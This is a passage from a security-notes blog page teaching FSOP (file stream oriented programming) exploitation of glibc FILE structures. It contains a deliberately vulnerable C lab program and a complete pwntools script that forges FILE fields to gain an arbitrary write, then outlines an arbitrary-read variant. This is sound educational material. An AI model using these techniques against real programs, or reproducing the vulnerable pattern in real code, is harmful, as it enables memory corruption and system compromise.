+To commit the write we have to flush the internal buffer or completely filled it. Note that closing the file stream would call <code>fflush</code> and whatever sitting in the internal buffer will be committed to the file.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_write_3_hu_3fb32fcbfbd0851.webp 330w,//localhost:1313/notes/fsop/fsop/file_write_3_hu_cad191381e7207a3.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_write_3_hu_d753b8f79d46346f.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/file_write_3_hu_17b533aa8f6eea6a.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1446"
+        height="2047"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_write_3_hu_b4ddf4147298cd34.png" srcset="//localhost:1313/notes/fsop/fsop/file_write_3_hu_59ed5c65a220bf5e.png 330w,//localhost:1313/notes/fsop/fsop/file_write_3_hu_b4ddf4147298cd34.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_write_3_hu_cdda6f12b4b8cfc9.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_write_3_hu_af3ef6d02a5d9a38.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="freading-into-memory" class="relative group">fread()ing into memory <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#freading-into-memory" aria-label="Anchor">#</a></span></h2><p>It&rsquo;s called reading into memory because we want to abuse the <code>_fileno</code> member of <code>FILE</code> struct and set it to our <code>stdin</code> file descriptor (commonly set as 0).
+Usually, the <code>_fileno</code> member represent the file descriptor of a file that we want to read from, but if we set it to <code>stdin</code> that effectively means we&rsquo;re writing from <code>stdin</code> to the internal buffer.
+And if we&rsquo;re able to control where the internal buffer located, we&rsquo;re achieving an arbitrary write primitive.</p>
+<p>To perform FSOP exploit in order to read into memory the following requirements must be fulfilled:</p>
+<ul>
+<li><code>_IO_buf_base</code> &lt;= <code>_IO_buf_end</code></li>
+<li>where <code>_IO_buf_end</code> - <code>_IO_buf_start</code> &gt;= number of bytes to write</li>
+</ul>
+<p>Take a look at the following C code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> win_var <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x100</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;win_var address = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>win_var);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* directly modify FILE struct members */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, f, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;_IO_buf_base = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;_IO_buf_end = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>_IO_buf_end);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;_fileno = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>_fileno);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;vtable = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>vtable);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fread</span>(buf, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>), <span style="color:#ae81ff">0x40</span>, f);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;_IO_buf_base = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;_IO_buf_end = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>_IO_buf_end);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;f-&gt;_fileno = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, f<span style="color:#f92672">-&gt;</span>_fileno);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (win_var)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You win!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Exitting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Analysis of the above source code:</p>
+<ul>
+<li>There&rsquo;s a variable named <code>win_var</code> that the program later tell us the address of</li>
+<li><code>win_var</code> will be check to confirm whether we&rsquo;ve successfully overwrite its content and will print &ldquo;You win!&rdquo; if we have</li>
+<li>It will open <code>/etc/passwd</code> in read mode thus opening a file stream for use</li>
+<li>Then we&rsquo;re given the ability to overwrite first 0x400 bytes memory of the file stream struct. It basically allows us to modify the <code>FILE</code> struct members</li>
+<li>It will call <code>fread</code> function that normally should read 0x40 bytes from the opened file stream into <code>buf</code>. Later we&rsquo;ll exploit this to achieve arbitrary write.</li>
+</ul>
+<p>Now knowing that the program will be very generous by giving us the ability to directly modify <code>FILE</code> struct member we can use this to learn how to get arbitrary write primitive. Remember that for achieving arbitrary write through hijacking <code>FILE</code> struct members, the following requirements have to be fulfilled:</p>
+<ul>
+<li><code>_IO_buf_base</code> &lt;= <code>_IO_buf_end</code></li>
+<li>where <code>_IO_buf_end</code> - <code>_IO_buf_start</code> &gt;= number of bytes to write
+Additionally we also have to set the <code>_fileno</code> member of <code>FILE</code> struct to <code>stdin</code> or 0</li>
+</ul>
+<p>Knowing all this information we can start to plan out what payload we should send to the program. The following snippet depict how we should overwrite the <code>FILE</code> struct</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> _flags              	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_ptr      	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_end      	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_base     	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_base    	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_ptr     	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_end     	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_base      	<span style="color:#f92672">=</span> win_var address
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_end       	<span style="color:#f92672">=</span> win_var address <span style="color:#f92672">+</span> length
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_base     	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_backup_base   	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_end      	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_marker <span style="color:#f92672">*</span>_markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE <span style="color:#f92672">*</span>_chain     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> _fileno                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> (stdin)
+</span></span></code></pre></div><p>Now we&rsquo;ve planned out how we should write our payload, it&rsquo;s time to actually write the exploit script.</p>
+<p>First we need a way to retrieve the address of <code>win_var</code> variable that the program gives to us</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; = &#34;</span>)
+</span></span><span style="display:flex;"><span>win_var_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
+</span></span></code></pre></div><p>Then we need to write the actual payload that will overwrite the <code>FILE</code> struct members and send it to the program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _flags</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_read_ptr</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_read_end</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_read_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_write_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_write_ptr</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_write_end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(win_var_addr)    <span style="color:#75715e"># _IO_buf_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(win_var_addr<span style="color:#f92672">+</span>l)  <span style="color:#75715e"># _IO_buf_end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_save_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_backup_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_save_end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_marker</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_FILE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _fileno</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span></code></pre></div><p>Finally we can just type in anything from <code>stdin</code> to overwrite the <code>win_var</code> variable value. I found that we have to send a newline at the beginning or else the value we type in won&rsquo;t find its way to overwrite <code>win_var</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(cyclic(l))
+</span></span></code></pre></div><p>Here&rsquo;s the full script to exploit the program&rsquo;s file stream to gain arbitrary write:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./read_into_memory&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(filename)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(filename)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;b *main+113
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; = &#34;</span>)
+</span></span><span style="display:flex;"><span>win_var_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;win_var_addr = </span><span style="color:#e6db74">{</span>hex(win_var_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _flags</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_read_ptr</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_read_end</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_read_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_write_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_write_ptr</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   			<span style="color:#75715e"># _IO_write_end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(win_var_addr)    <span style="color:#75715e"># _IO_buf_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(win_var_addr<span style="color:#f92672">+</span>l)  <span style="color:#75715e"># _IO_buf_end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_save_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_backup_base</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_save_end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_marker</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _IO_FILE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)               <span style="color:#75715e"># _fileno</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;len(payload) = </span><span style="color:#e6db74">{</span>len(payload)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_val <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(target_val<span style="color:#f92672">.</span>ljust(l, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="fwriteing-from-memory" class="relative group">fwrite()ing from memory <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fwriteing-from-memory" aria-label="Anchor">#</a></span></h2><p>Writing to a file meaning we&rsquo;re flushing what inside the internal buffer to the file.
+If we set the <code>_fileno</code> member of struct <code>FILE</code> to <code>stdout</code>, it grants us the ability read from the internal buffer.
+If we&rsquo;re also able to decide where the internal buffer is located in memory then we&rsquo;ve acquired an arbitrary read primitive.</p>
+<p>To perform FSOP exploit in order to write from memory the following requirements must be fulfilled:</p>
+<ul>
+<li><code>_IO_read_end</code> == <code>_IO_write_base</code></li>
+<li><code>_IO_write_base</code> &lt;= <code>_IO_write_ptr</code></li>
+<li>where <code>_IO_write_ptr</code> - <code>_IO_write_base</code> &gt;= number of bytes to read</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="1080"
+        height="1080"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="Griffin Sectio"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/img/author_hu_e3b4f002aaa01b9f.jpg" srcset="//localhost:1313/img/author_hu_3943c635ee7ddd8f.jpg 330w,//localhost:1313/img/author_hu_e3b4f002aaa01b9f.jpg 660w
+          
+            ,//localhost:1313/img/author_hu_d6332df19e9b1201.jpg 1024w
+          
+          
+            ,//localhost:1313/img/author.jpg 1080w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          Griffin Sectio
+        </div>
+      
+      
+        <div class="text-sm text-neutral-700 dark:text-neutral-400">A software engineer particularly interested in low-level programming and cybersecurity</div>
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="//localhost:1313/notes/buffer-overflow/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Buffer Overflow</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-11-26 01:52:08 &#43;0700 &#43;07">26 November 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="//localhost:1313/notes/fsop/_io_file-struct/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >I/O Structures</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-02-20 03:06:19 &#43;0700 &#43;07">20 February 2026</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            Griffin Sectio
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
